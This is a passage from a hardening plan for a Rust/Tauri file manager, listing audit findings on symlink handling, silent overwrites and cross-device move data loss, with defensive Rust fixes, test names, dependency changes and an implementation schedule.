- SSH keys (`~/.ssh/authorized_keys`): copied file may be world-readable,
  breaking SSH authentication
- Any file where mtime matters (build systems, rsync, backups)

**Add to `Cargo.toml`:**
```toml
filetime = "0.2"
```

**Add helper:**
```rust
fn copy_file_preserving_metadata(src: &Path, dest: &Path) -> Result<(), String> {
    fs::copy(src, dest).map_err(|e| format!("Failed to copy: {}", e))?;

    // Preserve permissions
    let src_meta = fs::metadata(src).map_err(|e| e.to_string())?;
    fs::set_permissions(dest, src_meta.permissions())
        .map_err(|e| format!("Failed to set permissions: {}", e))?;

    // Preserve timestamps
    let atime = filetime::FileTime::from_last_access_time(&src_meta);
    let mtime = filetime::FileTime::from_last_modification_time(&src_meta);
    filetime::set_file_times(dest, atime, mtime)
        .map_err(|e| format!("Failed to set timestamps: {}", e))?;

    Ok(())
}
```

Replace all `fs::copy(src, dest)` calls in `copy_items` and
`copy_dir_recursive` with `copy_file_preserving_metadata(src, dest)`.

**Tests:**
```
test_copy_preserves_execute_bit
test_copy_preserves_mtime
test_copy_ssh_key_does_not_become_world_readable
```

---

### 9.9  Copy: no existence check on sources before starting  (Medium)

**File:** `src-tauri/src/lib.rs:238-249`

Sources are not verified to exist before the loop starts. If source 1
copies successfully and source 2 does not exist, source 1's copy is already
at the destination. The user has a partial result with no indication of what
succeeded.

**Fix:** add a pre-flight pass:
```rust
for source in &sources {
    let p = Path::new(source);
    if !p.exists() {
        return Err(format!("Source does not exist: {}", source));
    }
}
// ... then execute
```

Or batch into a `BatchResult` (Phase 4.2) and continue rather than abort.

---

### 9.10  Copy/Move: trailing-slash path gives unhelpful error  (Low)

**File:** `src-tauri/src/lib.rs:240`, `280`

```rust
let file_name = src_path.file_name().ok_or("Invalid source path")?;
```

A path with a trailing slash (e.g. `/home/user/docs/`) has `file_name()`
return `None`. The error `"Invalid source path"` gives the user no
indication of what was wrong or which path.

**Fix:**
```rust
let file_name = src_path.file_name().ok_or_else(|| {
    format!("Cannot determine filename for path: {}", source)
})?;
```

---

### 9.11  Move: symlink-to-directory — worst case of D1 + C3  ⚠️ CRITICAL

**File:** `src-tauri/src/lib.rs:286`

```rust
if src_path.is_dir() {        // follows symlinks
    copy_dir_recursive(...)   // expands the symlink tree
    fs::remove_dir_all(src)   // then tries to delete the tree
```

For a symlink pointing to a directory:
1. `is_dir()` returns `true`
2. `copy_dir_recursive` materializes the full linked tree at the destination
3. `remove_dir_all` is called on the symlink path — on Linux this removes
   only the symlink, but on some filesystems it can recurse into the target

The net result is: the user moves what they think is a small symlink, gets
gigabytes copied to the destination, and the original symlink (and
potentially target contents) are removed.

**Fix:** same `symlink_metadata` pattern as 9.7, applied to the move fallback path.

---

### 9.12  Move: silent overwrite at destination  ⚠️ HIGH

**File:** `src-tauri/src/lib.rs:284`

POSIX `rename(2)` atomically replaces the destination if it already exists.
There is no check before the call. The user moves `report.pdf` into a
directory that already contains `report.pdf` — the existing file is silently
replaced and the source is gone. Both the destination original and the source
are now irrecoverable (not in trash).

**Fix:** check `target.exists()` before calling `rename` and return a
conflict error for the frontend to resolve, same as 9.5.

---

### 9.13  Move: cross-device fallback has a data-loss window  ⚠️ HIGH

**File:** `src-tauri/src/lib.rs:290-293`

The cross-device fallback sequence is:
```
1. fs::copy(src, target)   // data now exists in two places
2. fs::remove_file(src)    // original deleted
```

If the process is killed between steps 1 and 2 (power loss, SIGKILL, OOM),
both copies exist. That is recoverable. But if step 1 completes and step 2
fails for a reason other than the process dying (file locked on Windows,
permissions changed), the user receives an error saying the move failed
while the data is actually at the destination in full. They may re-try,
resulting in a second copy.

More dangerously: if step 1 partially completes (disk full mid-copy) and
returns an error, step 2 is never reached. But the destination now contains
a truncated/corrupt copy of the file. There is no cleanup of the partial
destination.

**Fix — safe cross-device move sequence:**
```rust
// 1. Copy to a temporary name in the destination directory
let tmp_target = target.with_file_name(format!(
    ".browseit-move-{}.tmp",
    std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap_or_default()
        .subsec_nanos()
));

// 2. Copy source to tmp_target
copy_file_preserving_metadata(src_path, &tmp_target)?;

// 3. Atomic rename tmp → final name (within same filesystem, so atomic)
fs::rename(&tmp_target, &target)
    .map_err(|e| {
        // Clean up the temp file before returning the error
        let _ = fs::remove_file(&tmp_target);
        format!("Failed to finalize move: {}", e)
    })?;

// 4. Only delete source after destination is confirmed
fs::remove_file(src_path)
    .map_err(|e| format!("Move completed but failed to remove source: {}", e))?;
```

For directories, the same pattern applies with a temp directory name.

---

### 9.14  Move: destination-inside-source guard missing for move  ⚠️ HIGH

Phase 7.3 of the original plan mentions this for `copy_items` only.
`move_items` has the same gap and is worse: moving `/home/user/docs` into
`/home/user/docs/backup/` triggers `copy_dir_recursive` which reads
`docs/` while writing into `docs/backup/docs/`, creating an ever-growing
tree until the disk is full.

**Fix:** canonicalize both paths (without following symlinks) and check:
```rust
let canonical_src = /* lexical normalization of src_path */;
let canonical_dest = /* lexical normalization of dest_path */;
if canonical_dest.starts_with(&canonical_src) {
    return Err(format!(
        "Cannot move '{}' into one of its own subdirectories", source
    ));
}
```

---

### 9.15  All three: no pre-flight validation before executing the batch  (High)

All three commands start executing item 1 immediately. Failures on item 3
leave items 1–2 already applied (irreversibly for permanent delete and
move).

**Recommended two-phase model:**

```rust
// Phase A: validate everything, collect errors
let mut errors: Vec<String> = Vec::new();
for source in &sources {
    if let Err(e) = validate_user_path(source) { errors.push(e); }
    if !Path::new(source).exists() { errors.push(format!("Not found: {}", source)); }
    let target = dest_path.join(...);
    if target.exists() { errors.push(format!("Conflict: {} already exists", target.display())); }
}
if !errors.is_empty() {
    return Err(errors.join("\n"));
}

// Phase B: execute (all inputs known-good)
for source in &sources { ... }
```

This surfaces all problems to the user upfront rather than applying a
partial batch.

---

### 9.16  All three: no progress reporting or cancellation  (Medium / UX)

A copy of 10 000 files or a move of 50 GB produces no feedback and cannot
be cancelled. The app appears frozen. This requires:

1. Moving the operation into a `std::thread::spawn` (or Tokio task)
2. Emitting Tauri events: `app.emit("operation-progress", payload)` where
   payload includes `{ total, done, current_file }`
3. A cancellation token (an `Arc<AtomicBool>` checked after each file)
4. Frontend progress dialog listening to the event

This is the largest scope item in the entire hardening plan. Suggested
implementation order: add the event infrastructure first (no UI change),
then wire up a progress dialog.

---

### Updated test additions for Phase 9

Add to `src-tauri/tests/integration_test.rs`:
```
test_delete_symlink_to_dir_removes_link_not_target
test_delete_symlink_to_file_removes_link_not_target
test_delete_readonly_file_windows
test_copy_silent_overwrite_returns_conflict_error
test_copy_preserves_execute_bit
test_copy_preserves_mtime
test_copy_symlink_recreated_not_expanded
test_copy_source_not_found_returns_error
test_copy_into_itself_rejected
test_move_symlink_to_dir_moves_link_not_target
test_move_silent_overwrite_returns_conflict_error
test_move_into_itself_rejected
test_move_cross_device_partial_copy_cleaned_up_on_error
test_move_cross_device_source_deleted_after_success
test_move_permission_error_on_rename_not_silently_ignored
test_batch_delete_validates_all_before_executing
test_batch_copy_validates_all_before_executing
test_batch_move_validates_all_before_executing
```

---

## Dependency Changes Summary

| Crate | Version | Reason |
|---|---|---|
| `tempfile` | `3` | Atomic config writes (Phase 2.1) |
| `thiserror` | `1` | Structured error type (Phase 4.1) |
| `libc` | `0.2` | EXDEV detection in move_items (Phase 4.3) |
| `sysinfo` | `0.30` | Real disk space in get_volumes (Phase 5) |
| `dirs` | `5` | Platform-correct home/config dirs (Phase 6) |
| `filetime` | `0.2` | Preserve mtime/atime on copy (Phase 9.8) |

Remove: the hand-rolled `mod dirs` block in `lib.rs`.

---

## Implementation Order

| Phase | Risk | Est. effort | Blocks |
|---|---|---|---|
| 1.1  Windows terminal injection | Critical | 30 min | nothing |
| 1.2  Context action arg injection | Critical | 1 h | nothing |
| 2.1  Atomic config writes | High | 1 h | nothing |
| 2.2  Bounded read_text_file | High | 30 min | nothing |
| 2.3  Stream compress_to_zip | High | 1 h | nothing |
| 2.4  copy_dir symlinks (internal) | High | 1 h | nothing |
| 2.5  Path validation helper | High | 2 h | Phase 4 tests |
| 3    Enable CSP | High | 30 min | nothing |
| 4.1  Structured error type | Medium | 2 h | 4.2–4.3 |
| 4.2  BatchResult for deletes | Medium | 1 h | 4.1 |
| 4.3  move_items rename error | Medium | 30 min | nothing |
| 4.4  cap max_results | Medium | 15 min | nothing |
| 4.5  log dropped entries | Low | 15 min | nothing |
| 5    Real disk space | Medium | 1 h | nothing |
| 6    Platform config dir | Low | 30 min | nothing |
| 7.1  is_hidden Windows | Low | 30 min | nothing |
| 7.2  rename same-dir guard | Low | 15 min | 2.5 |
| 7.3  copy/move into itself (copy) | Low | 15 min | 2.5 |
| 7.4  window counter cap | Low | 10 min | nothing |
| 9.1  Delete: symlink→dir deletes target | Critical | 30 min | nothing |
| 9.2  Delete: trash skips validation | High | 15 min | 2.5 |
| 9.3  Delete: partial tree on failure | Medium | 1 h | 4.1 |
| 9.4  Delete: read-only on Windows | Low | 30 min | nothing |
| 9.5  Copy: silent overwrite conflict | High | 1 h | nothing |
| 9.6  Copy: ghost dir on failure | Medium | 1 h | nothing |
| 9.7  Copy: outer is_dir follows symlinks | High | 30 min | 2.4 |
| 9.8  Copy: preserve permissions+mtime | Medium | 1 h | nothing |
| 9.9  Copy: no source existence pre-check | Medium | 30 min | nothing |
| 9.10 Copy/Move: trailing-slash error msg | Low | 15 min | nothing |
| 9.11 Move: symlink→dir worst case | Critical | 30 min | 9.1, 9.7 |
| 9.12 Move: silent overwrite conflict | High | 30 min | 9.5 |
| 9.13 Move: cross-device data-loss window | High | 2 h | 9.8 |
| 9.14 Move: dest-inside-source guard | High | 30 min | 2.5 |
| 9.15 All: pre-flight batch validation | High | 2 h | 2.5, 4.1 |
| 9.16 All: progress reporting + cancel | Medium | 4–6 h | nothing |
| 8    Full test suite | High | 6–8 h | All above |

**Total estimated effort: ~30–36 hours of focused implementation.**

Suggested PR grouping:
- **PR 1 — "Critical safety"**: 1.1, 1.2, 9.1, 9.11 (injection + symlink data loss)
- **PR 2 — "Data safety"**: 2.1, 9.5, 9.12, 9.13 (atomic writes + overwrite/move safety)
- **PR 3 — "Memory safety"**: 2.2, 2.3, 2.4, 9.7, 9.8 (OOM + symlinks + permissions)
- **PR 4 — "Path hardening"**: 2.5, 9.2, 9.14, 7.2, 7.3 (validation helper wired everywhere)
- **PR 5 — "CSP + structured errors"**: 3, 4.1, 4.2, 4.3, 9.3, 9.15 (error types + pre-flight)
- **PR 6 — "Robustness"**: 4.4, 4.5, 5, 6, 7.1, 9.4, 9.6, 9.9, 9.10, 7.4 (all medium/low)
- **PR 7 — "Test coverage"**: 8 (all unit, integration, security tests)
- **PR 8 — "Progress reporting"**: 9.16 (largest scope, own PR)
